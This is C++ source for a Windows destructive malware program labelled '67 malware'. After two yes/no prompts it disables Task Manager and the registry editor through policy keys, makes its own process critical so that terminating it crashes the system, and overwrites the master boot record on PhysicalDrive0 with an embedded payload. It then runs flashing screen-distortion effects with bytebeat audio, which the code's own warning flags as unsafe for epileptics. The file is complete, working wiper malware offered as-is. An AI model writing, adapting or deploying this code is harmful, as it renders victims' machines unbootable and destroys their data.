#include <windows.h>
#include <mmsystem.h>
#include <cmath>
#include <thread>
#include <atomic>

#pragma comment(lib, "winmm.lib")

typedef LONG(WINAPI* RtlAdjustPrivilegeFunc)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef LONG(WINAPI* NtRaiseHardErrorFunc)(LONG, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
typedef VOID(NTAPI* RSPICdef)(BOOLEAN, PBOOLEAN, BOOLEAN);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

std::atomic<bool> isSoundFinished(false);

int screenWidth = 0;
int screenHeight = 0;

DWORD WINAPI MBRWiper(LPVOID lpParam) {
    unsigned char writeBuffer[512];
    memset((void*)writeBuffer, 0, 512);
    HRSRC hRes = FindResourceA(GetModuleHandle(NULL), MAKEINTRESOURCEA(101), "BINARY");
    if (hRes == NULL) return 0; 
    HGLOBAL hData = LoadResource(GetModuleHandle(NULL), hRes);
    if (hData == NULL) return 0;
    unsigned char* bootBuffer = (unsigned char*)LockResource(hData);
    DWORD bootSize = SizeofResource(GetModuleHandle(NULL), hRes);
    if (bootBuffer != NULL && bootSize > 0) {
        DWORD bytesToCopy = (bootSize > 512) ? 512 : bootSize;
        memcpy((void*)writeBuffer, (const void*)bootBuffer, bytesToCopy);
    }
    else {
        return 0;
    }
    if (writeBuffer[510] == 0 && writeBuffer[511] == 0) {
        writeBuffer[510] = 0x55;
        writeBuffer[511] = 0xAA;
    }
    HANDLE hDisk = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDisk != INVALID_HANDLE_VALUE) {
        DWORD bytesWritten = 0;
        WriteFile(hDisk, (LPCVOID)writeBuffer, 512, &bytesWritten, NULL);
        CloseHandle(hDisk);
    }
}
void BlockSystemUtility(const char* subKey, const char* valueName, DWORD valueData) {
    HKEY hKey;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, subKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, valueName, 0, REG_DWORD, (const BYTE*)&valueData, sizeof(DWORD));
        RegCloseKey(hKey);
    }
}
void PlayBytebeat(size_t bufferSize, const unsigned char* audioData) {
    HWAVEOUT hWaveOut;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };

    if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR) {
        return;
    }

    WAVEHDR waveHdr = { 0 };
    waveHdr.lpData = (LPSTR)audioData;
    waveHdr.dwBufferLength = bufferSize;

    waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &waveHdr, sizeof(WAVEHDR));

    while (!(waveHdr.dwFlags & WHDR_DONE)) {
        Sleep(50);
    }

    waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI SoundPhase1(LPVOID) {
    size_t size = 0x36b00;
    unsigned char* buffer = new unsigned char[size];
    for (size_t u = 0; u < size; u++) {
        buffer[u] = (u * ((u >> 12 | u >> 8) & 63 & u >> 4)) / 7;
    }
    PlayBytebeat(size, buffer);
    delete[] buffer;
    isSoundFinished = true;
    return 0;
}

DWORD WINAPI SoundPhase2(LPVOID) {
    size_t size = 0x3e800;
    unsigned char* buffer = new unsigned char[size];
    for (size_t u = 0; u < size; u++) {
        buffer[u] = ((u >> 4) | (u >> 8)) * u & (u >> 5) | ((u >> 7 | u >> 5) * u >> ((u >> 12) & 3));
    }
    PlayBytebeat(size, buffer);
    delete[] buffer;
    isSoundFinished = true;
    return 0;
}

DWORD WINAPI SoundPhase3(LPVOID) {
    size_t size = 280000;
    unsigned char* buffer = new unsigned char[size];
    const char* pattern = "36364646";
    for (size_t u = 0; u < size; u++) {
        buffer[u] = ((u >> 11) & (u >> 12) & 3) * ((u >> 4) & (u >> 8)) |
            (((u >> 9) | (u >> 13)) & (u >> 6) & 0xf) * u |
            (pattern[u >> 13 & 7] - '0') * u & (u >> 5);
    }
    PlayBytebeat(size, buffer);
    delete[] buffer;
    isSoundFinished = true;
    return 0;
}

DWORD WINAPI SoundPhase4(LPVOID) {
    size_t size = 320000;
    unsigned char* buffer = new unsigned char[size];
    for (size_t u = 0; u < size; u++) {
        buffer[u] = (unsigned char)(((u >> 10 & 5) + 1) * (u >> 13 & 3) * u >> (u >> 9 & 3));
    }
    PlayBytebeat(size, buffer);
    delete[] buffer;
    isSoundFinished = true;
    return 0;
}

DWORD WINAPI SoundPhase5(LPVOID) {
    size_t size = 400000;
    unsigned char* buffer = new unsigned char[size];
    for (size_t u = 0; u < size; u++) {
        buffer[u] = (char)((u >> 5 | u) >> (u >> 15 & 63)) * (char)u;
    }
    PlayBytebeat(size, buffer);
    delete[] buffer;
    isSoundFinished = true;
    return 0;
}

DWORD WINAPI SoundPhase6(LPVOID) {
    size_t size = 0x36b00;
    unsigned char* buffer = new unsigned char[size];
    const char* pattern = "35787532";
    for (size_t u = 0; u < size; u++) {
        buffer[u] = (pattern[u >> 11 & 7] - '0') * u & (u >> 4) | ((u >> 8) | (u >> 5)) * u & 0x40;
    }
    PlayBytebeat(size, buffer);
    delete[] buffer;
    isSoundFinished = true;
    return 0;
}

DWORD WINAPI SoundPhase7(LPVOID) {
    size_t size = 0x6d600;
    unsigned char* buffer = new unsigned char[size];
    const char* pattern = "345678";
    for (size_t u = 0; u < size; u++) {
        buffer[u] = (pattern[u >> 12 & 5] - '0') * u & (u >> 4) | ((u >> 9) | (u >> 14)) * u & 0x1e;
    }
    PlayBytebeat(size, buffer);
    delete[] buffer;
    isSoundFinished = true;
    return 0;
}

DWORD WINAPI SoundPhase8(LPVOID) {
    size_t size = 240000;
    unsigned char* buffer = new unsigned char[size];
    for (size_t u = 0; u < size; u++) {
        unsigned char bVar1 = 0;
        unsigned char bVar3 = 2;
        if ((u & 0x1000) == 0) {
            if ((u & 0x4000) != 0) {
                buffer[u] = (char)(u >> 3);
                continue;
            }
        }
        else if (u < 0xe800) {
            bVar1 = (u & 7) * u;
            bVar3 = (-((u & 0x4000) == 0) & 0xf8U) + 10;
        }
        else {
            bVar3 = 10;
            bVar1 = (unsigned char)(u << 4);
        }
        buffer[u] = bVar1 | (unsigned char)(u >> (bVar3 & 0x3f));
    }
    PlayBytebeat(size, buffer);
    delete[] buffer;
    isSoundFinished = true;
    return 0;
}

DWORD WINAPI SoundPhase9(LPVOID) {
    size_t size = 240000;
    unsigned char* buffer = new unsigned char[size];
    unsigned char bVar3 = 0;
    for (size_t u = 0; u < size; u++) {
        unsigned char bVar1 = bVar3 & 0x3f;
        bVar3 += 14;
        buffer[u] = (char)((((u >> 1) + 20 ^ 3) * u * u >> bVar1) >> 18);
    }
    PlayBytebeat(size, buffer);
    delete[] buffer;
    isSoundFinished = true;
    return 0;
}

void RunPhase1(HDC hdc) {
    isSoundFinished = false;
    CreateThread(NULL, 0, SoundPhase1, NULL, 0, NULL);
    float fVar3 = 0.0f;
    while (!isSoundFinished) {
        int x = (int)(sin(fVar3) * 35.0) + 7;
        int y = (int)(cos(fVar3) * 25.0) + 7;
        StretchBlt(hdc, x, y, screenWidth - 15, screenHeight - 15, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
        Sleep(10);
        fVar3 += 0.07f;
    }
}

void RunPhase2(HDC hdc) {
    isSoundFinished = false;
    CreateThread(NULL, 0, SoundPhase2, NULL, 0, NULL);
    float fVar6 = 0.0f, fVar7 = 0.0f;
    float fVar8 = screenWidth / 2.0f, fVar9 = screenHeight / 2.0f;
    float local_ec = 8.0f, fVar10 = 6.0f;
    SetBkMode(hdc, TRANSPARENT);

    while (!isSoundFinished) {
        fVar8 += local_ec; fVar9 += fVar10;
        if (fVar8 <= 0.0f || screenWidth <= fVar8 + 180.0f) local_ec = -local_ec;
        if (fVar9 <= 0.0f || screenHeight <= fVar9 + 130.0f) fVar10 = -fVar10;

        double dVar3 = sin(fVar6);
        HFONT h = CreateFontW((int)(dVar3 * 25.0) + 110, 0, 0, 0, 700, 0, 0, 0, 0, 0, 0, 0, 0, L"Impact");
        HGDIOBJ old = SelectObject(hdc, h);

        SetTextColor(hdc, RGB((int)(sin(fVar6) * 127 + 128), (int)(sin(fVar6 + 2.0) * 127 + 128), (int)(sin(fVar6 + 4.0) * 127 + 128)));
        TextOutW(hdc, (int)fVar8, (int)fVar9, L"67", 2);

        SelectObject(hdc, old);
        DeleteObject(h);
        Sleep(15);
        fVar7 += 0.08f; fVar6 += 0.1f;
    }
}

void RunPhase3(HDC hdc) {
    isSoundFinished = false;
    CreateThread(NULL, 0, SoundPhase3, NULL, 0, NULL);
    while (!isSoundFinished) {
        int w = rand() % 150 + 100;
        int h = rand() % 150 + 100;
        int x = rand() % (screenWidth - w);
        int y = rand() % (screenHeight - h);
        BitBlt(hdc, x, y, w, h, hdc, x, y, SRCINVERT);

        for (int i = 0; i < 350; i++) {
            SetPixel(hdc, rand() % screenWidth, rand() % screenHeight, RGB(rand() % 256, rand() % 256, rand() % 256));
        }
        Sleep(4);
    }
}

void RunPhase4(HDC hdc) {
    isSoundFinished = false;
    CreateThread(NULL, 0, SoundPhase4, NULL, 0, NULL);
    while (!isSoundFinished) {
        int w = rand() % 400 + 200;
        int h = rand() % 400 + 200;
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256));
        HGDIOBJ old = SelectObject(hdc, brush);
        PatBlt(hdc, rand() % (screenWidth - w), rand() % (screenHeight - h), w, h, PATINVERT);
        SelectObject(hdc, old);
        DeleteObject(brush);
        Sleep(10);
    }
}

void RunPhase5(HDC hdc) {
    isSoundFinished = false;
    CreateThread(NULL, 0, SoundPhase5, NULL, 0, NULL);
    while (!isSoundFinished) {
        StretchBlt(hdc, 10, 10, screenWidth - 20, screenHeight - 20, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
        Sleep(100);
    }
}

void RunPhase6(HDC hdc) {
    isSoundFinished = false;
    CreateThread(NULL, 0, SoundPhase6, NULL, 0, NULL);
    float fVar3 = 0.0f;
    while (!isSoundFinished) {
        int x = (int)(sin(fVar3) * 80.0);
        if (rand() % 10 == 0) x += -15 + rand() % 30;
        BitBlt(hdc, x, 0, screenWidth, screenHeight, hdc, 0, 0, SRCCOPY);
        Sleep(20);
        fVar3 += 0.08f;
    }
}

void RunPhase7(HDC hdc) {
    isSoundFinished = false;
    CreateThread(NULL, 0, SoundPhase7, NULL, 0, NULL);
    HICON hIcon = LoadIconA(NULL, (LPCSTR)32513);
    float fVar3 = 0.0f;
    while (!isSoundFinished) {
        int x = (int)((screenWidth / 2.5) * sin(fVar3)) + screenWidth / 2;
        int y = (int)((screenHeight / 2.5) * cos(fVar3 * 1.5)) + screenHeight / 2;
        SetCursorPos(x, y);
        DrawIcon(hdc, x, y, hIcon);
        StretchBlt(hdc, -15, -15, screenWidth + 30, screenHeight + 30, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
        Sleep(15);
        fVar3 += 0.06f;
    }
}

void RunPhase8(HDC hdc) {
    isSoundFinished = false;
    CreateThread(NULL, 0, SoundPhase8, NULL, 0, NULL);
    while (!isSoundFinished) {
        int y = rand() % screenHeight;
        int h = rand() % 100 + 50;
        BitBlt(hdc, rand() % 60 - 30, y, screenWidth, h, hdc, 0, y, SRCCOPY);
        BitBlt(hdc, rand() % 30 - 15, rand() % 30 - 15, screenWidth, screenHeight, hdc, 0, 0, SRCAND);
        Sleep(10);
    }
}

void RunPhase9(HDC hdc) {
    isSoundFinished = false;
    CreateThread(NULL, 0, SoundPhase9, NULL, 0, NULL);
    while (!isSoundFinished) {
        int w = rand() % 60 + 40;
        int x = rand() % screenWidth;
        int h = rand() % 15 + 5;
        BitBlt(hdc, x, h, w, screenHeight - h, hdc, x, 0, SRCCOPY);
        if (rand() % 5 == 0) {
            BitBlt(hdc, x, 0, w, screenHeight, hdc, x, 0, SRCINVERT);
        }
        Sleep(10);
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    int msg1 = MessageBoxW(NULL, L"Run 67 malware?", L"67.exe", MB_YESNO | MB_ICONWARNING);
    if (msg1 == IDYES) {
        int msg2 = MessageBoxW(NULL, L"Are you sure? For not epileptics!", L"Warning", MB_YESNO | MB_ICONWARNING);
        if (msg2 == IDYES) {
            BlockSystemUtility("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", 1);
            BlockSystemUtility("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", 1);
            BlockSystemUtility("Software\\Policies\\Microsoft\\Windows\\MMC", "RestrictToPermittedSnapIns", 1);

            HMODULE hNtdllModule = GetModuleHandleA("ntdll.dll");
            if (hNtdllModule) {
                BOOLEAN bl;
                RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(hNtdllModule, "RtlAdjustPrivilege");
                RSPICdef fSetCritical = (RSPICdef)GetProcAddress(hNtdllModule, "RtlSetProcessIsCritical");
                if (RtlAdjustPrivilege != NULL && fSetCritical != NULL) { RtlAdjustPrivilege(20, TRUE, FALSE, &bl); fSetCritical(TRUE, NULL, FALSE); }
            }

            MBRWiper(hInstance);
            Sleep(1000);
            HDC hdc = GetDC(NULL);
            screenWidth = GetSystemMetrics(SM_CXSCREEN);
            screenHeight = GetSystemMetrics(SM_CYSCREEN);
            RunPhase1(hdc);
            RunPhase2(hdc);
            RunPhase3(hdc);
            RunPhase4(hdc);
            RunPhase5(hdc);
            RunPhase6(hdc);
            RunPhase7(hdc);
            RunPhase8(hdc);
            RunPhase9(hdc);
            ReleaseDC(NULL, hdc);
            ExitProcess(0);
        }
    }
    return 0;
}
